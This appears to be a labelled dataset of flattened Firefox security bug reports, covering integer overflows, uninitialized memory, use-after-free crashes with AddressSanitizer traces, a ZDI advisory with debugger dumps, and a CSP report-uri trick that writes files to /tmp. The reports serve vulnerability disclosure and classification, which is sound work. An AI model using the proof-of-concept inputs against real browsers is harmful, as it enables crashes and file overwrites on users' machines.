ycbcrimagedatadeserializer todatasourcesurface using uninitialized memory user agent mozilla/5.0 windows rv:26.0 gecko/20100101 firefox/26.0 build id 20150305021524 steps to reproduce in firefox 38.0.1 ycbcrimagedatadeserializer todatasourcesurface uses uninitialized memory at gfx\layers\ycbcrimagedataserializer.cpp line 292 et seq the problem is that ycbcrimagedatadeserializer todatasourcesurface does not check the return value from datasourcesurface map at line 290 thus on failure and for some derived classes of datasourcesurface e.g datasourcesurfaced2d leaving untouched whatever was contained in the uninitialized variable map datasourcesurface mappedsurface map result map datasourcesurface maptype write map gfx convertycbcrtorgb32 getydata getcbdata getcrdata map.mdata 0 0 pic x and y getysize width getysize height getystride getcbcrstride map.mstride gfx yv12 result unmap since map can contain anything this bug could make it possible to write data into anywhere in firefox s address space depending on how todatasourcesurface is used this bug might be exploitable to disclose sensitive data and/or cause execution of attacker-selected code	11
nsziparchive buildfilelist has memory-safety bug user agent mozilla/5.0 windows rv gecko/20100101 firefox build id 20150305021524 steps to reproduce an attacker could force nsziparchive buildfilelist to read memory that it does not own possibly leading to a crash disclosure of sensitive information or execution of code chosen by an attacker the problem is in the function s failure to validate the offsets of zip central directories code beginning at line 624 extracts the first central directory offset from the zip-end record 624 for buf endp zipend_size buf startp buf 625 626 if xtolong buf endsig 627 centraloffset xtolong zipend buf offset_central_dir 628 break 629 630 631 line 637 then sets the buffer pointer buf to startp centraloffset without doing more than a cursory validation of centraloffset 632 633 if centraloffset 634 return ns_error_file_corrupted 635 636 read the central directory headers 637 buf startp centraloffset the code then uses buf to find and read central directories 638 uint32_t sig 0 639 while buf int32_t sizeof uint32_t endp 640 sig xtolong buf centralsig 641 make sure there is enough data available 642 if endp buf zipcentral_size 643 return ns_error_file_corrupted 644 645 read the fixed-size data 646 zipcentral central zipcentral buf 647 648 uint16_t namelen xtoint central filename_len 649 lots more where that came from the problem occurs if the first-encountered zip-end record contains an offset_central_dir field that is very large thus making centraloffset very large in this case the rhs of line 637 can overflow especially on 32-bit platforms setting buf to somewhere startp since buf is then perforce endp this does not trip the check on line 639 if buf happens to contain centralsig the code at line 638 et seq interprets it as a valid central directory with unpredictable consequences further down the road when it s used i guess that this defect could be used for example to inject javascript from domain a into domain b this bug might explain	11
memory safety problem in arraybufferbuilder append user agent mozilla/5.0 windows rv gecko/20100101 firefox build id 20150305021524 steps to reproduce arraybufferbuilder append in dom\base\nsxmlhttprequest.cpp can overwrite memory it does not own if adatalen is very large for example assume that mlength=2 adatalen and mcapacity=2 in this case the lhs on line 4019 overflows giving the value 1 control then skips to line 4047 assume a release build which copies adatalen bytes from anewdata all over firefox s address space presumably this eventually will cause an access-violation crash on 32-bit platforms but perhaps not before some other thread uses the written data to do something undesirable on 64-bit platforms execution might continue for a long time depending upon how address space is laid out i do n't know however whether arraybufferbuilder append is exposed to external content in such a way that this defect can be exploited i suppose that a server could send back a defective xmlhttprequest containing a very large length though perhaps other code checks for this problem 4013 bool 4014 arraybufferbuilder append const uint8_t anewdata uint32_t adatalen 4015 uint32_t amaxgrowth 4016 4017 moz_assert mmapptr 4018 4019 if mlength adatalen mcapacity 4020 uint32_t newcap 4021 double while under amaxgrowth or if not specified 4022 if amaxgrowth mcapacity amaxgrowth 4023 newcap mcapacity 2 4024 else 4025 newcap mcapacity amaxgrowth 4026 4027 4028 but make sure there s always enough to satisfy our request 4029 if newcap mlength adatalen 4030 newcap mlength adatalen 4031 4032 4033 did we overflow 4034 if newcap mcapacity 4035 return false 4036 4037 4038 if setcapacity newcap 4039 return false 4040 4041 4042 4043 assert that the region is n't overlapping so we can memcpy 4044 moz_assert areoverlappingregions anewdata adatalen mdataptr mlength 4045 adatalen 4046 4047 memcpy mdataptr mlength anewdata adatalen 4048 mlength adatalen 4049 4050 return true 4051	11
overflow in nsxmlhttprequest appendtoresponsetext causes memory-safety bug user agent mozilla/5.0 windows nt 5.1 rv:36.0 gecko/20100101 firefox/36.0 build id 20150305021524 steps to reproduce nsxmlhttprequest appendtoresponsetext 38.0.1\dom\base\nsxmlhttprequest.cpp can write to memory that it does not own 665 nsresult 666 nsxmlhttprequest appendtoresponsetext const char asrcbuffer 667 uint32_t asrcbufferlen 668 669 ns_ensure_state mdecoder 670 671 int32_t destbufferlen 672 nsresult rv mdecoder getmaxlength asrcbuffer asrcbufferlen 673 destbufferlen 674 ns_ensure_success rv rv 675 676 if mresponsetext.setcapacity mresponsetext.length destbufferlen fallible 677 return ns_error_out_of_memory 678 679 680 char16_t destbuffer mresponsetext.beginwriting mresponsetext.length 681 682 int32_t totalchars mresponsetext.length 683 684 this code here is basically a copy of a similar thing in 685 nsscanner append const char abuffer uint32_t alen 686 int32_t srclen int32_t asrcbufferlen 687 int32_t destlen int32_t destbufferlen 688 rv mdecoder convert asrcbuffer 689 srclen 690 destbuffer 691 destlen 692 the bug is in line 676 if mresponsetext.length destbufferlen overflows line 676 will setcapacity to a value smaller than mresponsetext s current length the remaining code will then write data beginning at the end of the buffer mresponsetext.beginwriting mresponsetext.length since the response text from an xmlhttprequest is under external control this bug could be leveraged to corrupt firefox s address space possibly causing execution of attacker-chosen code presumably this problem can occur only under 64-bit oses	11
stagefright delete array user agent mozilla/5.0 windows nt 6.1 win64 x64 applewebkit/537.36 khtml like gecko chrome/46.0.2490.86 safari/537.36 steps to reproduce array creation l689 element destruction should be array destruction delete instead of delete l405 actual results crash expected results correct destruction of array	11
lack of status return from nsscannerstring appendunicodeto causes out-of-bounds read in appenderrorpointer nsscannerstring appendunicodeto parser\htmlparser\nsscannerstring.cpp calls nsastring setlength which can fallibly fail under oom conditions but appendunicodeto does not return status so its callers incorrectly assume that it can not fail when the caller is appenderrorpointer parser\htmlparser\nsexpatdriver.cpp and a document similar to the attached proof-of-concept is loaded this omission causes appenderrorpointer to read memory to which it has no right afaikt this does n't cause a meaningful information leak only a broken error string and/or a crash however there are many other callers of nsscannerstring appendunicodeto plus there are callers of nsscannerstring copyunicodeto which has a similar bug probably some of these callers malfunction insecurely when appendunicodeto or copyunicodeto fail the bug is still present in the current trunk details the bug is in the void return type 485 void 486 appendunicodeto const nsscanneriterator asrcstart 487 const nsscanneriterator asrcend 488 nsastring adest 489 490 nsastring iterator writer 491 uint32_t oldlength adest.length 492 if adest.setlength oldlength distance asrcstart asrcend mozilla fallible 493 return out of memory 494 adest.beginwriting writer advance oldlength 495 nsscanneriterator frombegin asrcstart 496 497 copy_multifragment_string frombegin asrcend writer 498 with the attached poc this bug causes out-of-bounds reading in appenderrorpointer this occurs because nsexpatdriver consumetoken line 1126 updates its mexpatparser.mposition.col member to account for the number of just-consumed characters consumed 1 then it calls appendunicodeto to append those characters to mlastline line 1139 1115 uint32_t consumed 1116 parsebuffer buffer length nomorebuffers consumed 1117 if consumed 0 1118 nsscanneriterator oldexpatposition currentexpatposition 1119 currentexpatposition.advance consumed 1120 1121 we consumed some data we want to store the last line of data that 1122 was consumed in case we run into an error to show the line in which 1123 the error occurred 1124 1125 the length of the last line that expat has parsed 1126 xml_size lastlinelength xml_getcurrentcolumnnumber mexpatparser 1127 1128 if lastlinelength consumed 1129 the length of the last line was less than what expat consumed so 1130 there was at least one line break in the consumed data store the 1131 last line until the point where we stopped parsing 1132 nsscanneriterator startlastline currentexpatposition 1133 startlastline.advance ptrdiff_t lastlinelength 1134 copyunicodeto startlastline currentexpatposition mlastline 1135 1136 else 1137 there was no line break in the consumed data append the consumed 1138 data 1139 appendunicodeto oldexpatposition currentexpatposition mlastline 1140 1141 but this fails because the resulting string is longer than the maximum allowed by nsstring enforced by nstsubstring_chart mutateprep because appendunicodeto does n't return status consumetoken does n't learn about this failure and so does n't correct mposition to account for it thus mposition indexes data that s beyond the end of mlastline consumetoken then plows ahead calling nsexpatdriver handleerror line 1184 1160 if ns_failed minternalstate 1161 if xml_geterrorcode mexpatparser xml_error_none 1162 ns_assertion minternalstate ns_error_htmlparser_stopparsing 1163 unexpected error 1184 handleerror 1185 1186 1187 return minternalstate 1188 which calls xml_getcurrentcolumnnumber line 946 884 nsresult 885 nsexpatdriver handleerror 886 887 int32_t code xml_geterrorcode mexpatparser 945 adjust the column number so that it is one based rather than zero based 946 uint32_t colnumber xml_getcurrentcolumnnumber mexpatparser 1 947 uint32_t linenumber xml_getcurrentlinenumber mexpatparser 948 949 nsautostring errortext 950 createerrortext description.get xml_getbase mexpatparser linenumber 951 colnumber errortext 952 953 ns_assertion msink no sink which reads the updated mposition member then handleerror passes the resulting out-of-bounds value to appenderrorpointer 954 955 nsautostring sourcetext mlastline 956 appenderrorpointer colnumber mlastline.get sourcetext which then reads from the out-of-bounds locations in mlastline line 868 856 static nsresult 857 appenderrorpointer const int32_t acolnumber 858 const char16_t asourceline 859 nsstring asourcestring 860 861 asourcestring.append char16_t n 862 863 last character will be 864 int32_t last acolnumber 1 865 int32_t i 866 uint32_t minuses 0 867 for i 0 i last i 868 if asourceline i t 869 since this uses white-space pre a tab stop equals 8 spaces 870 uint32_t add 8 minuses 8 871 asourcestring.appendascii add 872 minuses add 873 874 else 875 asourcestring.append char16_t 876 minuses 877 878 879 asourcestring.append char16_t 880 881 return ns_ok 882 since the read is used only to decide what to put into the error string asourcestring there is no meaningful data leak to use the poc run ff 42.0 win64 and attach a debugger to it set a breakpoint on nsexpatdriver line 1118 with the condition consumed then load the poc when the bp fires notice how line 1126 updates mexpatparser.mposition.col to then step to line 1139 and notice that oldlength is and that the call to setlength fails leaving adest with length step out and see that mlastline is also thus characters long step past lines 1160-1182 which append one more character to mlastline which append succeeds because the resulting length does n't exceeed nsastring s limit then step into handleerror notice colnumber at line 946 is step into appenderrorpointer noticing that line 864 assigns to last examine asourceline last-1 and notice it s inaccessible memory or sometimes uninitialized memory let execution proceed and watch the probable read-access violation crash it might take a minute or two to crash because appenderrorpointer appends one character at a time to the error message string note that the poc has the invalid character following text which is necessary to cause the parse error that causes handleerror to be called 1 yes xml_getcurrentcolumnnumber mexpatparser updates mexpatparser.mposition.col	11
csp s report-uri over writes files firefox can be forced to over write files on the user s host when prompted to report policy violations to a file resource or chrome url while the last two are tricky to exploit since they most likely require vulnerable add-ons the first is dead simple the attacker does not have full control of the report but can control multiple values inside of the report json structure for a demonstration of the issue you may visit the following link with a unix host and check your tmp directory afterwards it should contain a file called attack_works.html the attack sends the following csp header and then violates it content-security-policy script-src none report-uri file tmp/attack_works.html works in ff 42 43 44 the first tested version where it does not work anymore is the nightly build 47.xx why do i report the issue anyway two reasons maybe it was fixed by accident and the severity went unnoticed i am in the course of writing a thesis so i d love to have something to reference and if this is a duplicate i d like to reference that sorry i m being very selfish	2
write av near null in atomicbaseincdec heap uaf in nsautoptr txaxmleventhandler nsautoptr tested on latest firefox 44 compiled with asan+debug description depending on the xml source to be transformed two different crashes a heap uaf and a write to null can be seen xslt xsl stylesheet version 1.0 xmlns xsl xsl template match xsl variable name v xsl text foo xsl text xsl apply-imports xsl variable xsl attribute name v xsl template xsl stylesheet xml 1 top zou zou top output 1 addresssanitizer segv on unknown address pc sp bp t0 0 in std atomic_base int fetch_sub int std memory_order tools/gcc-4.7.3-0moz1/lib/gcc/x86_64-unknown-linux-gnu/4.7.3 include/c++/4.7.3/bits/atomic_base.h:582 1 in mozilla detail atomicbaseincdec int mozilla memoryordering 2 operator builds/slave/m-cen-l64-asan-d-0000000000000/build/src/obj-firefox/js/src dist/include/mozilla/atomics.h:565 2 in nsstringbuffer release builds/slave/m-cen-l64-asan-d-0000000000000/build/src/xpcom/string/nssubstring.cpp:197 3 in txtexthandler txtexthandler builds/slave/m-cen-l64-asan-d-0000000000000/build/src/dom/xslt/xslt/txtexthandler.h:12 4 in txsetvariable execute txexecutionstate builds/slave/m-cen-l64-asan-d-0000000000000/build/src/dom/xslt/xslt/txinstructions.cpp:808 5 in txxsltprocessor execute txexecutionstate builds/slave/m-cen-l64-asan-d-0000000000000/build/src/dom/xslt/xslt/txxsltprocessor.cpp:49 6 in txmozillaxsltprocessor transformtodoc nsidomdocument bool builds/slave/m-cen-l64-asan-d-0000000000000/build/src/dom/xslt/xslt/txmozillaxsltprocessor.cpp:681 7 in txmozillaxsltprocessor transformtodocument nsinode mozilla errorresult builds/slave/m-cen-l64-asan-d-0000000000000/build/src/dom/xslt/xslt/txmozillaxsltprocessor.cpp:1329 8 in mozilla dom xsltprocessorbinding transformtodocument jscontext js handle jsobject txmozillaxsltprocessor jsjitmethodcallargs const builds/slave/m-cen-l64-asan-d-0000000000000/build/src/obj-firefox/dom/bindings/./xsltprocessorbinding.cpp:153 9 in mozilla dom genericbindingmethod jscontext unsigned int js value builds/slave/m-cen-l64-asan-d-0000000000000/build/src/dom/bindings/bindingutils.cpp:2691 10 in js calljsnative jscontext bool jscontext unsigned int js value js callargs const builds/slave/m-cen-l64-asan-d-0000000000000/build/src/js/src/jscntxtinlines.h:235 11 in js invoke jscontext js callargs const js maybeconstruct builds/slave/m-cen-l64-asan-d-0000000000000/build/src/js/src/vm/interpreter.cpp:772:16 12 in interpret jscontext js runstate builds/slave/m-cen-l64-asan-d-0000000000000/build/src/js/src/vm/interpreter.cpp:3105 13 in js runscript jscontext js runstate builds/slave/m-cen-l64-asan-d-0000000000000/build/src/js/src/vm/interpreter.cpp:725 14 in js executekernel jscontext js handle jsscript jsobject js value const js value const js executetype js abstractframeptr js value builds/slave/m-cen-l64-asan-d-0000000000000/build/src/js/src/vm/interpreter.cpp:1000 15 in js execute jscontext js handle jsscript jsobject js value builds/slave/m-cen-l64-asan-d-0000000000000/build/src/js/src/vm/interpreter.cpp:1034 16 in executescript jscontext js handle jsobject js handle jsscript js value builds/slave/m-cen-l64-asan-d-0000000000000/build/src/js/src/jsapi.cpp:4598 17 in js_executescript jscontext js handle jsscript js mutablehandle js value builds/slave/m-cen-l64-asan-d-0000000000000/build/src/js/src/jsapi.cpp:4624 18 in processfile mozilla dom autojsapi char const io_file bool builds/slave/m-cen-l64-asan-d-0000000000000/build/src/js/xpconnect/src/xpcshellimpl.cpp:876 19 in process mozilla dom autojsapi char const bool builds/slave/m-cen-l64-asan-d-0000000000000/build/src/js/xpconnect/src/xpcshellimpl.cpp:929 20 in processargs mozilla dom autojsapi char int xpcshelldirprovider builds/slave/m-cen-l64-asan-d-0000000000000/build/src/js/xpconnect/src/xpcshellimpl.cpp:1128 21 in xre_xpcshellmain builds/slave/m-cen-l64-asan-d-0000000000000/build/src/js/xpconnect/src/xpcshellimpl.cpp:1546 22 in main builds/slave/m-cen-l64-asan-d-0000000000000/build/src/js/xpconnect/shell/xpcshell.cpp:54 23 lib/x86_64-linux-gnu/libc.so.6 24 in start home/azureuser/ff-44/xpcshell live demo 1 xml 2 top zou zou top output 2 assertion we re leaking mes mresulthandler mes mresulthandler this file builds/slave/m-cen-l64-asan-d-0000000000000/build/src/dom/xslt/xslt/txunknownhandler.cpp line 80 33391==error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in nsautoptr txaxmleventhandler nsautoptr builds/slave/m-cen-l64-asan-d-0000000000000/build/src/obj-firefox/dom/xslt/xslt dist/include/nsautoptr.h:74 1 in txexecutionstate txexecutionstate builds/slave/m-cen-l64-asan-d-0000000000000/build/src/dom/xslt/xslt/txexecutionstate.cpp:94 2 in txmozillaxsltprocessor transformtodoc nsidomdocument bool builds/slave/m-cen-l64-asan-d-0000000000000/build/src/dom/xslt/xslt/txmozillaxsltprocessor.cpp:706 3 in txmozillaxsltprocessor transformtodocument nsinode mozilla errorresult builds/slave/m-cen-l64-asan-d-0000000000000/build/src/dom/xslt/xslt/txmozillaxsltprocessor.cpp:1329 4 in mozilla dom xsltprocessorbinding transformtodocument jscontext js handle jsobject txmozillaxsltprocessor jsjitmethodcallargs const builds/slave/m-cen-l64-asan-d-0000000000000/build/src/obj-firefox/dom/bindings/./xsltprocessorbinding.cpp:153 5 in mozilla dom genericbindingmethod jscontext unsigned int js value builds/slave/m-cen-l64-asan-d-0000000000000/build/src/dom/bindings/bindingutils.cpp:2691 6 in js calljsnative jscontext bool jscontext unsigned int js value js callargs const builds/slave/m-cen-l64-asan-d-0000000000000/build/src/js/src/jscntxtinlines.h:235 7 in js invoke jscontext js callargs const js maybeconstruct builds/slave/m-cen-l64-asan-d-0000000000000/build/src/js/src/vm/interpreter.cpp:772:16 8 in interpret jscontext js runstate builds/slave/m-cen-l64-asan-d-0000000000000/build/src/js/src/vm/interpreter.cpp:3105 9 in js runscript jscontext js runstate builds/slave/m-cen-l64-asan-d-0000000000000/build/src/js/src/vm/interpreter.cpp:725 10 in js executekernel jscontext js handle jsscript jsobject js value const js value const js executetype js abstractframeptr js value builds/slave/m-cen-l64-asan-d-0000000000000/build/src/js/src/vm/interpreter.cpp:1000 11 in js execute jscontext js handle jsscript jsobject js value builds/slave/m-cen-l64-asan-d-0000000000000/build/src/js/src/vm/interpreter.cpp:1034 12 in executescript jscontext js handle jsobject js handle jsscript js value builds/slave/m-cen-l64-asan-d-0000000000000/build/src/js/src/jsapi.cpp:4598 13 in js_executescript jscontext js handle jsscript js mutablehandle js value builds/slave/m-cen-l64-asan-d-0000000000000/build/src/js/src/jsapi.cpp:4624 14 in processfile mozilla dom autojsapi char const io_file bool builds/slave/m-cen-l64-asan-d-0000000000000/build/src/js/xpconnect/src/xpcshellimpl.cpp:876 15 in process mozilla dom autojsapi char const bool builds/slave/m-cen-l64-asan-d-0000000000000/build/src/js/xpconnect/src/xpcshellimpl.cpp:929 16 in processargs mozilla dom autojsapi char int xpcshelldirprovider builds/slave/m-cen-l64-asan-d-0000000000000/build/src/js/xpconnect/src/xpcshellimpl.cpp:1128 17 in xre_xpcshellmain builds/slave/m-cen-l64-asan-d-0000000000000/build/src/js/xpconnect/src/xpcshellimpl.cpp:1546 18 in main builds/slave/m-cen-l64-asan-d-0000000000000/build/src/js/xpconnect/shell/xpcshell.cpp:54 19 lib/x86_64-linux-gnu/libc.so.6 20 in start home/azureuser/ff-44/xpcshell is located 0 bytes inside of 40-byte region freed by thread t0 here 0 in interceptor_free builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:64 1 in txexecutionstate txexecutionstate builds/slave/m-cen-l64-asan-d-0000000000000/build/src/dom/xslt/xslt/txexecutionstate.cpp:85:37 2 in txmozillaxsltprocessor transformtodoc nsidomdocument bool builds/slave/m-cen-l64-asan-d-0000000000000/build/src/dom/xslt/xslt/txmozillaxsltprocessor.cpp:706 3 in txmozillaxsltprocessor transformtodocument nsinode mozilla errorresult builds/slave/m-cen-l64-asan-d-0000000000000/build/src/dom/xslt/xslt/txmozillaxsltprocessor.cpp:1329 4 in mozilla dom xsltprocessorbinding transformtodocument jscontext js handle jsobject txmozillaxsltprocessor jsjitmethodcallargs const builds/slave/m-cen-l64-asan-d-0000000000000/build/src/obj-firefox/dom/bindings/./xsltprocessorbinding.cpp:153 5 in mozilla dom genericbindingmethod jscontext unsigned int js value builds/slave/m-cen-l64-asan-d-0000000000000/build/src/dom/bindings/bindingutils.cpp:2691 6 in js calljsnative jscontext bool jscontext unsigned int js value js callargs const builds/slave/m-cen-l64-asan-d-0000000000000/build/src/js/src/jscntxtinlines.h:235 7 in js invoke jscontext js callargs const js maybeconstruct builds/slave/m-cen-l64-asan-d-0000000000000/build/src/js/src/vm/interpreter.cpp:772:16 8 in interpret jscontext js runstate builds/slave/m-cen-l64-asan-d-0000000000000/build/src/js/src/vm/interpreter.cpp:3105 9 in js runscript jscontext js runstate builds/slave/m-cen-l64-asan-d-0000000000000/build/src/js/src/vm/interpreter.cpp:725 10 in js executekernel jscontext js handle jsscript jsobject js value const js value const js executetype js abstractframeptr js value builds/slave/m-cen-l64-asan-d-0000000000000/build/src/js/src/vm/interpreter.cpp:1000 11 in js execute jscontext js handle jsscript jsobject js value builds/slave/m-cen-l64-asan-d-0000000000000/build/src/js/src/vm/interpreter.cpp:1034 12 in executescript jscontext js handle jsobject js handle jsscript js value builds/slave/m-cen-l64-asan-d-0000000000000/build/src/js/src/jsapi.cpp:4598 13 in js_executescript jscontext js handle jsscript js mutablehandle js value builds/slave/m-cen-l64-asan-d-0000000000000/build/src/js/src/jsapi.cpp:4624 14 in processfile mozilla dom autojsapi char const io_file bool builds/slave/m-cen-l64-asan-d-0000000000000/build/src/js/xpconnect/src/xpcshellimpl.cpp:876 15 in process mozilla dom autojsapi char const bool builds/slave/m-cen-l64-asan-d-0000000000000/build/src/js/xpconnect/src/xpcshellimpl.cpp:929 16 in processargs mozilla dom autojsapi char int xpcshelldirprovider builds/slave/m-cen-l64-asan-d-0000000000000/build/src/js/xpconnect/src/xpcshellimpl.cpp:1128 17 in xre_xpcshellmain builds/slave/m-cen-l64-asan-d-0000000000000/build/src/js/xpconnect/src/xpcshellimpl.cpp:1546 18 in main builds/slave/m-cen-l64-asan-d-0000000000000/build/src/js/xpconnect/shell/xpcshell.cpp:54 19 lib/x86_64-linux-gnu/libc.so.6 previously allocated by thread t0 here 0 in interceptor_malloc builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:74 1 in moz_xmalloc builds/slave/m-cen-l64-asan-d-0000000000000/build/src/memory/mozalloc/mozalloc.cpp:83 2 in operator new unsigned long builds/slave/m-cen-l64-asan-d-0000000000000/build/src/obj-firefox/dom/xslt/xslt dist/include/mozilla/mozalloc.h:186 3 in txtodochandlerfactory createhandlerwith txoutputformat txaxmleventhandler builds/slave/m-cen-l64-asan-d-0000000000000/build/src/dom/xslt/xslt/txmozillaxsltprocessor.cpp:92 4 in txexecutionstate init txxpathnode const txowningexpandednamemap txiglobalparameter builds/slave/m-cen-l64-asan-d-0000000000000/build/src/dom/xslt/xslt/txexecutionstate.cpp:112 5 in txmozillaxsltprocessor transformtodoc nsidomdocument bool builds/slave/m-cen-l64-asan-d-0000000000000/build/src/dom/xslt/xslt/txmozillaxsltprocessor.cpp:677 6 in txmozillaxsltprocessor transformtodocument nsinode mozilla errorresult builds/slave/m-cen-l64-asan-d-0000000000000/build/src/dom/xslt/xslt/txmozillaxsltprocessor.cpp:1329 7 in mozilla dom xsltprocessorbinding transformtodocument jscontext js handle jsobject txmozillaxsltprocessor jsjitmethodcallargs const builds/slave/m-cen-l64-asan-d-0000000000000/build/src/obj-firefox/dom/bindings/./xsltprocessorbinding.cpp:153 8 in mozilla dom genericbindingmethod jscontext unsigned int js value builds/slave/m-cen-l64-asan-d-0000000000000/build/src/dom/bindings/bindingutils.cpp:2691 9 in js calljsnative jscontext bool jscontext unsigned int js value js callargs const builds/slave/m-cen-l64-asan-d-0000000000000/build/src/js/src/jscntxtinlines.h:235 10 in js invoke jscontext js callargs const js maybeconstruct builds/slave/m-cen-l64-asan-d-0000000000000/build/src/js/src/vm/interpreter.cpp:772:16 11 in interpret jscontext js runstate builds/slave/m-cen-l64-asan-d-0000000000000/build/src/js/src/vm/interpreter.cpp:3105 12 in js runscript jscontext js runstate builds/slave/m-cen-l64-asan-d-0000000000000/build/src/js/src/vm/interpreter.cpp:725 13 in js executekernel jscontext js handle jsscript jsobject js value const js value const js executetype js abstractframeptr js value builds/slave/m-cen-l64-asan-d-0000000000000/build/src/js/src/vm/interpreter.cpp:1000 14 in js execute jscontext js handle jsscript jsobject js value builds/slave/m-cen-l64-asan-d-0000000000000/build/src/js/src/vm/interpreter.cpp:1034 15 in executescript jscontext js handle jsobject js handle jsscript js value builds/slave/m-cen-l64-asan-d-0000000000000/build/src/js/src/jsapi.cpp:4598 16 in js_executescript jscontext js handle jsscript js mutablehandle js value builds/slave/m-cen-l64-asan-d-0000000000000/build/src/js/src/jsapi.cpp:4624 17 in processfile mozilla dom autojsapi char const io_file bool builds/slave/m-cen-l64-asan-d-0000000000000/build/src/js/xpconnect/src/xpcshellimpl.cpp:876 18 in process mozilla dom autojsapi char const bool builds/slave/m-cen-l64-asan-d-0000000000000/build/src/js/xpconnect/src/xpcshellimpl.cpp:929 19 in processargs mozilla dom autojsapi char int xpcshelldirprovider builds/slave/m-cen-l64-asan-d-0000000000000/build/src/js/xpconnect/src/xpcshellimpl.cpp:1128 20 in xre_xpcshellmain builds/slave/m-cen-l64-asan-d-0000000000000/build/src/js/xpconnect/src/xpcshellimpl.cpp:1546 21 in main builds/slave/m-cen-l64-asan-d-0000000000000/build/src/js/xpconnect/shell/xpcshell.cpp:54 22 lib/x86_64-linux-gnu/libc.so.6 summary addresssanitizer heap-use-after-free builds/slave/m-cen-l64-asan-d-0000000000000/build/src/obj-firefox/dom/xslt/xslt dist/include/nsautoptr.h:74 nsautoptr txaxmleventhandler nsautoptr live demo 2	11
zdi-can-3545 mozilla firefox nshtml5treebuilder array indexing remote code execution vulnerability we received the following security bug report from zdi zdi-can-3545 mozilla firefox nshtml5treebuilder array indexing remote code execution vulnerability cvss 6.8 av n/ac m/au n/c p/i p/a p abstract hp s zero day initiative has identified a vulnerability affecting the following products mozilla firefox vulnerability details tested on windows 8.1 f70.4d0 access violation code c0000005 first chance first chance exceptions are reported before any exception handling this exception may be expected and handled eax=41414141 ebx=ffffffff ecx=17e6adfc edx=00000002 esi=108a4860 edi=0a675ec0 eip=5f00c7d5 esp=0049d068 ebp=00000002 iopl=0 nv up ei pl nz ac pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00210216 xul nshtml5treebuilder endtag 5f00c7d5 83780c03 cmp dword ptr eax+0ch 3 ds:0023:4141414d 0:000 lmi xul loaded module info xul module xul base address 5e800000 image name c program files\mozilla firefox\xul.dll machine type 332 i386 time stamp 568c8871 tue jan 05 19:22:25 2016 size 255b000 checksum 24bdf46 characteristics 2122 debug data dirs type size va pointer codeview 76 1ed7e78 1ed6e78 rsds guid 0aed2a28-9f61-4c0a-86b0-6c0fd6f2a00f age 2 pdb c builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\obj-firefox\toolkit\library\xul.pdb 14 1ed7ef0 1ed6ef0 data not mapped clsid 4 1ed7f04 1ed6f04 data not mapped image type file image read successfully from debugger c program files\mozilla firefox\xul.dll symbol type pdb symbols loaded successfully from image path z export\symbols\xul.pdb\0aed2a289f614c0a86b06c0fd6f2a00f2\xul.pdb compiler linker front end 0.0 bld 0 back end 12.0 bld 30723 load report private symbols lines source indexed z export\symbols\xul.pdb\0aed2a289f614c0a86b06c0fd6f2a00f2\xul.pdb 0:000 lmvm xul start end module name 5e800000 60d5b000 xul private pdb symbols z export\symbols\xul.pdb\0aed2a289f614c0a86b06c0fd6f2a00f2\xul.pdb loaded symbol image file c program files\mozilla firefox\xul.dll image path c program files\mozilla firefox\xul.dll image name xul.dll timestamp tue jan 05 19:22:25 2016 568c8871 checksum 024bdf46 imagesize 0255b000 file version 43.0.4.5848 product version 43.0.4.5848 file flags 0 mask 3f file os 4 unknown win32 file type 2.0 dll file date 00000000.00000000 translations 0000.04b0 companyname mozilla foundation productname firefox internalname firefox originalfilename xul.dll productversion 43.0.4 fileversion 43.0.4 filedescription 43.0.4 legalcopyright license mpl 2 legaltrademarks mozilla comments mozilla tested on the nightly build from 20150120 cec.750 access violation code c0000005 first chance first chance exceptions are reported before any exception handling this exception may be expected and handled eax=41414141 ebx=ffffffff ecx=1abb66fc edx=00000002 esi=0fbcfb80 edi=0d067100 eip=5beda4da esp=006dcb58 ebp=006dcb6c iopl=0 nv up ei pl nz ac pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00210216 xul nshtml5treebuilder endtag 5beda4da 83780c03 cmp dword ptr eax+0ch 3 ds:0023:4141414d 0:000 ub eip xul nshtml5treebuilder endtag c builds\moz2_slave\m-cen-w32-ntly-000000000000000\build\src\parser\html\nshtml5treebuilder.cpp 3033 5beda4bb e9906ac1ff jmp xul nshtml5treebuilder endtag 5baf0f50 5beda4c0 807e1400 cmp byte ptr esi+14h 0 5beda4c4 0f85e76dc1ff jne xul nshtml5treebuilder endtag 5baf12b1 5beda4ca e9906bc1ff jmp xul nshtml5treebuilder endtag 5baf105f 5beda4cf 8b5e38 mov ebx dword ptr esi+38h 5beda4d2 8b4630 mov eax dword ptr esi+30h 5beda4d5 8d0c98 lea ecx eax+ebx 4 5beda4d8 8b01 mov eax dword ptr ecx 0:000 dc ecx 1abb66fc 41414141 109408e0 17766ac0 17766c60 aaaa jv lv 1abb670c 17766c40 e5e5e5e5 e5e5e5e5 e5e5e5e5 lv 1abb671c e5e5e5e5 e5e5e5e5 e5e5e5e5 e5e5e5e5 1abb672c e5e5e5e5 e5e5e5e5 e5e5e5e5 e5e5e5e5 1abb673c e5e5e5e5 e5e5e5e5 e5e5e5e5 e5e5e5e5 1abb674c e5e5e5e5 e5e5e5e5 e5e5e5e5 e5e5e5e5 1abb675c e5e5e5e5 e5e5e5e5 e5e5e5e5 e5e5e5e5 1abb676c e5e5e5e5 e5e5e5e5 e5e5e5e5 e5e5e5e5 0:000 dc ecx-10 1abb66ec 41414141 424241c4 41414141 424241c4 aaaa.abbaaaa.abb 1abb66fc 41414141 109408e0 17766ac0 17766c60 aaaa jv lv 1abb670c 17766c40 e5e5e5e5 e5e5e5e5 e5e5e5e5 lv 1abb671c e5e5e5e5 e5e5e5e5 e5e5e5e5 e5e5e5e5 1abb672c e5e5e5e5 e5e5e5e5 e5e5e5e5 e5e5e5e5 1abb673c e5e5e5e5 e5e5e5e5 e5e5e5e5 e5e5e5e5 1abb674c e5e5e5e5 e5e5e5e5 e5e5e5e5 e5e5e5e5 1abb675c e5e5e5e5 e5e5e5e5 e5e5e5e5 e5e5e5e5 0:000 kv childebp retaddr args to child 006dcb6c 5baf2c8f 0d08a8d0 00000038 19373530 xul nshtml5treebuilder endtag conv thiscall c builds\moz2_slave\m-cen-w32-ntly-000000000000000\build\src\parser\html\nshtml5treebuilder.cpp 2743 006dcb80 5baf1a89 00000000 00000038 